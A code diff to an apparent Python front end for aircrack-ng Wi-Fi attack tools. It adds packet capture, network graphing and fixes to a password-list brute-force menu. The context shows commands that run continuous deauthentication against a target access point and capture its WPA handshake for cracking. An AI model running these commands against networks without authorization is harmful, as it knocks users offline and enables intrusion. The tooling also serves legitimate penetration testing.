@@ -715,6 +715,13 @@ def get_SSIDs_with_PSK_authentication_from_output(output):
     :return: list of SSIDs where authentication is 'PSK'
     """
     output = output_ansi_management(output)
+    if output is None:
+        print(f'there is a problem with f{ansi_escape_red("output_ansi_management(output)")}')
+        print(f'probably a new update to {ansi_escape_green("aircrack-ng package")} was made that changed the ansi pattern on stdout'
+              f'or the pattern is not recognized in output_ansi_management(output)')
+        print(f'Create a issue on {ansi_escape_green("github")}.')
+        input(f'input anything to return : ')
+        return
     authentications = []
     for column in output.split('\n'):
         row = column.split()
@@ -787,14 +794,10 @@ def capture_handshake(interface, target_ap):
 
     output = get_airodump_output(interface)
     if output is None:
-        # print(repr(output))
         print(
             f'If you see Airodump output above (BSSID,STATION,PWR,...) then the scan was successful However it appears there are no devices connected to {ansi_escape_green(target_ap)}')
         print(
-            f'If you {ansi_escape_red("dont")} see Airodump output then there is a problem with {ansi_escape_red("output_ansi_management")}')
-        print(
-            f'If that`s the case then uncomment the print(repr(output)) 3 lines above this message in the source code and check the ansi escape output and check if a start/end pattern exist in  {ansi_escape_red("output_ansi_management")}')
-        print(f'and contact me on {ansi_escape_green("github")}')
+            f'If you {ansi_escape_red("dont")} see Airodump output then there is a problem with {ansi_escape_red("get_airodump_output")}')
         input(f'input anything to return to previous function \n')
         return
 
@@ -825,7 +828,7 @@ def capture_handshake(interface, target_ap):
 
                 airodump_handshake_capture_location = f'/tmp/{target_ap}-handshakeCapture/{target_ap}'
 
-                print(f'Writin Capture files to /tmp/{target_ap}-handshakeCapture/{target_ap} ')
+                print(f'Writing Capture files to /tmp/{target_ap}-handshakeCapture/')
                 aireplay = subprocess.Popen(f'{terminal} -e aireplay-ng --deauth 0 -a {BSSID} {interface}', shell=True,
                                             preexec_fn=os.setsid)
                 airodump = subprocess.Popen(f'airodump-ng --bssid {BSSID} -c {CHANNEL} -w {airodump_handshake_capture_location} {interface}',
@@ -952,10 +955,10 @@ def bruteforce_handshake_capture(interface,target_ap):
             print(f"\nType the name of the password list to be used in bruteforce attack (for example common.txt) : ")
             print(f'or type {ansi_escape_green("1")} to give a path to your own password list : ')
             print(f'or type {ansi_escape_green("999")} to cancel bruteforce attack and return to network attacks menu : \n')
-            selected_password_list = input(f'filename/1').strip()
-            if selected_password_list == 999: # exit this while loop
+            selected_password_list = input(f'filename/1/999 : ').strip()
+            if selected_password_list == '999': # exit this while loop
                 return
-            if selected_password_list == 1:
+            if selected_password_list == '1':
                 selected_password_list = input(f'give a path to your own password list : ').strip()
                 print(f'your passowrd list is {ansi_escape_green(selected_password_list)}')
                 selection = input('type y to continue with this password list or type anything to reselect : ').lower().strip()
@@ -980,10 +983,92 @@ def bruteforce_handshake_capture(interface,target_ap):
             input('Process Complete. check the aircrack terminal to see if it found a match')
             return
 
-def graph_networks():
-    print("To graph a network first you need to have a csv file captured with")
+
+def capture_packets(interface, target_ap):
+    output = get_airodump_output(interface)
+    if output is None:
+        print(
+            f'If you see Airodump output above (BSSID,STATION,PWR,...) then the scan was successful However it appears there are no devices connected to {ansi_escape_green(target_ap)}')
+        print(
+            f'If you {ansi_escape_red("dont")} see Airodump output then there is a problem with {ansi_escape_red("get_airodump_output")}')
+        input(f'input anything to return to previous function \n')
+        return
 
 
+    elif output and 'Failed initializing wireless card(s)'.lower() not in output.lower():
+        BSSID, CHANNEL = get_BSSID_and_Station_from_AP(interface,target_ap)
+        print(f'Running packet capture on {ansi_escape_green(target_ap)}')
+        print(f'Switching channel on  {ansi_escape_green(interface)} to {ansi_escape_green(CHANNEL)}')
+        switch_channel = subprocess.Popen(f'iwconfig {interface} channel {CHANNEL}', shell=True)
+        switch_channel.wait()
 
+        print(f'Running airodump {ansi_escape_green(target_ap)}')
 
+        target_directory = f'/tmp/{target_ap}-Captures'
+        os.makedirs(target_directory, exist_ok=True)
 
+        airodump_capture_location = f'/tmp/{target_ap}-Captures/{target_ap}'
+
+        airodump = subprocess.Popen(f'airodump-ng --bssid {BSSID} -c {CHANNEL} -w {airodump_capture_location} {interface}',
+            shell=True, preexec_fn=os.setsid,)
+
+        time.sleep(30)
+
+        clear()
+        try:
+            os.killpg(airodump.pid, signal.SIGTERM)
+            airodump.wait()
+        except ProcessLookupError:
+            print('airodump killed unexpectedly', ProcessLookupError)
+
+        print(f"Packet Capture is saved in '{ansi_escape_green('/tmp/{target_ap}-Captures/')}'")
+
+    else:
+        print('==================================================================================================\n')
+        print(f'This message is from {ansi_escape_green("capture_handshake")}')
+        print(f'There is a problem with {ansi_escape_red("get_devices_in_AP_output")}')
+        input(f'input anything to return to previous function \n')
+        return
+
+def graph_networks(target_ap):
+    clear()
+
+    print(f"To graph a network first you need to have a {ansi_escape_green('csv')} file captured with airodump\n")
+    print(f'Here is the list of all csv files that start with {ansi_escape_green(target_ap)} in /tmp/ directory\n')
+    # only .csv is needed so print files that match({target_ap}-*.csv) so we need to exclude .log.csv and .kismet.csv from the printing process
+
+    find_files_with_locate = subprocess.run(
+        f"find /tmp/ -type f -name '{target_ap}-*.csv' ! -name '*log.csv' ! -name '*kismet.csv'",
+        shell=True,
+        capture_output=True,
+        text=True  # This automatically decodes output to string
+    )
+    print(find_files_with_locate.stdout)
+
+    print(f'\ntype the address of the .csv file to continue')
+    print(f'Or type 999 to return to Network attacks menu (use Network attacks to capture packets for {ansi_escape_green(target_ap)})')
+    while 1:
+        capture_file_address = input('address/999 : ').strip()
+        if capture_file_address == '999':
+            return # returns to network attacks
+        print(f" selected address is {ansi_escape_green(capture_file_address)}")
+        selection = input('input Y to continue with this address (input anything else to select another address):').lower().strip()
+        if selection == 'y':
+            break # breaks out of while
+    clear()
+    print(f"Using {ansi_escape_green('airgraph-ng')}  with {ansi_escape_green(capture_file_address)}")
+
+    while 1:
+        selection = input('CAPR / CPG').lower()
+        if selection == 'capr':
+            graph_output_location = f'/tmp/{target_ap}-CAPR';
+            airgraph_command = f'airgraph-ng -i {capture_file_address} -o {graph_output_location} -g CAPR'
+            break
+        if selection == 'cpg':
+            graph_output_location = f'/tmp/{target_ap}-CPG';
+            airgraph_command = f'airgraph-ng -i {capture_file_address} -o {graph_output_location} -g CPG'
+            break
+    airgraph = subprocess.Popen(airgraph_command, shell=True)
+    airgraph.wait()
+    input(f'output saved in {graph_output_location} press enter to continue')
+    return
